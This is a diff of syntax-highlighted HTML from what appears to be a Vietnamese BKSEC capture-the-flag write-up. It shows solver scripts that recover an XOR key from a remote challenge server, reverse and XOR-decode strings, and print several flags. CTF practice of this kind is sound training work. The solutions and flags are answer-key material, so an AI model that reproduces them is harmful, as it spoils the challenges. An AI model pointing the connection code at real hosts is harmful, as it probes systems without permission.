-<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">Q</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">k</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">t</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">T</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">U</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">N</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="sh">''</span><span class="p">]</span> <span class="o">*</span> <span class="mi">60</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="p">[</span><span class="s">'Q'</span><span class="p">,</span> <span class="s">'k'</span><span class="p">,</span> <span class="s">'t'</span><span class="p">,</span> <span class="s">'T'</span><span class="p">,</span> <span class="s">'R'</span><span class="p">,</span> <span class="s">'U'</span><span class="p">,</span> <span class="s">'N'</span><span class="p">,</span> <span class="s">'7'</span><span class="p">]</span> <span class="o">+</span> <span class="p">[</span><span class="s">''</span><span class="p">]</span> <span class="o">*</span> <span class="mi">60</span>
 <span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">50</span>
 
 <span class="c1"># brute-force to find key
-</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
-    <span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="n">strip</span><span class="p">()</span>
     <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 
-    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
-        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
-    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">key</span><span class="p">[(</span><span class="n">pivot</span> <span class="o">+</span> <span class="n">j</span><span class="p">)</span> <span class="o">%</span> <span class="mi">50</span><span class="p">]</span> <span class="o">=</span> <span class="n">encode</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">j</span><span class="p">])</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
     
-    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
 
 <span class="n">key</span> <span class="o">=</span> <span class="p">[</span><span class="mi">73</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">99</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">117</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">111</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">102</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">67</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">97</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">103</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">95</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="mi">33</span><span class="p">]</span>
 
-<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">45.77.247.61</span><span class="sh">"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"45.77.247.61"</span><span class="p">,</span> <span class="mi">7021</span><span class="p">)</span>
 
-<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-<span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="nf">strip</span><span class="p">()</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">2</span><span class="p">::].</span><span class="n">strip</span><span class="p">()</span>
 <span class="n">pivot</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
-<span class="n">decoded</span> <span class="o">=</span> <span class="sh">''</span>
+<span class="n">decoded</span> <span class="o">=</span> <span class="s">''</span>
 
 <span class="n">i</span> <span class="o">=</span> <span class="n">pivot</span>
 <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">encoded</span><span class="p">:</span>
-    <span class="n">decoded</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">50</span><span class="p">])</span>
+    <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">50</span><span class="p">])</span>
     <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
     <span class="n">i</span> <span class="o">%=</span> <span class="mi">50</span>
 
-<span class="nf">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">decoded</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">decoded</span><span class="p">))</span>
 
-<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="c1"># BKSEC{W0vv_1_d0nt_th1nk_y0u_c4n_r3c0v3r_my_m3554g3}
 </span></code></pre></div></div>
 
@@ -1551,8 +1551,8 @@ flag.lua: Lua bytecode, version 5.3
   <li>input2 = đảo ngược của <code class="language-plaintext highlighter-rouge">})12387642t234g789_UaD_t3h_@Uhc}eheh_n0ul_1Uv_Al_</code></li>
 </ul>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">BKSEC{rev3r5e_r@t</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">})12387642t234g789_UaD_t3h_@Uhc}eheh_n0ul_1Uv_Al_</span><span class="sh">"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
-<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flag</span> <span class="o">=</span> <span class="s">"BKSEC{rev3r5e_r@t"</span> <span class="o">+</span> <span class="s">"})12387642t234g789_UaD_t3h_@Uhc}eheh_n0ul_1Uv_Al_"</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 <span class="c1"># BKSEC{rev3r5e_r@t_lA_vU1_lu0n_hehe}chU@_h3t_DaU_987g432t24678321)}
 </span></code></pre></div></div>
 
@@ -1594,7 +1594,7 @@ flag.lua: Lua bytecode, version 5.3
 <span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4B</span>
 <span class="n">flag</span><span class="p">[</span><span class="mh">0xB</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x6D</span>
 
-<span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="nf">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">]))</span>
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">]))</span>
 <span class="c1"># BKSEC{w3lC0mE_tO_R3v}
 </span></code></pre></div></div>
 
@@ -1668,17 +1668,17 @@ flag.lua: Lua bytecode, version 5.3
 <p>Kết thúc quá trình, ta thu được <code class="language-plaintext highlighter-rouge">encrypted_arr</code>. Đem so sánh <code class="language-plaintext highlighter-rouge">encrypted_arr</code> và <code class="language-plaintext highlighter-rouge">check_arr</code>, nếu 2 mảng bằng nhau hàm <code class="language-plaintext highlighter-rouge">check()</code> sẽ trả về kết quả đúng.</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ans</span> <span class="o">=</span> <span class="p">[</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">133</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">75</span><span class="p">,</span> <span class="mi">166</span><span class="p">,</span> <span class="mi">157</span><span class="p">,</span> <span class="mi">189</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">172</span><span class="p">,</span> <span class="mi">155</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">222</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">144</span><span class="p">,</span> <span class="mi">211</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">116</span><span class="p">,</span> <span class="mi">121</span><span class="p">,</span> <span class="mi">76</span><span class="p">,</span> <span class="mi">154</span><span class="p">,</span> <span class="mi">168</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">94</span> <span class="p">]</span>
-<span class="n">key</span> <span class="o">=</span> <span class="sh">"</span><span class="s">ThisIsAFlag</span><span class="sh">"</span>
+<span class="n">key</span> <span class="o">=</span> <span class="s">"ThisIsAFlag"</span>
 
-<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span> 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">ans</span><span class="p">)):</span> 
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span> 
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ans</span><span class="p">)):</span> 
     <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> 
-        <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)]))</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="nf">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]))</span> <span class="o">^</span> <span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
-        <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+        <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">ans</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">flag</span><span class="p">[</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]))</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
+        <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
 
-<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 <span class="c1"># BKSEC{ju$t_h@rd3r_2_re@d_:P}
 </span></code></pre></div></div>
  -->
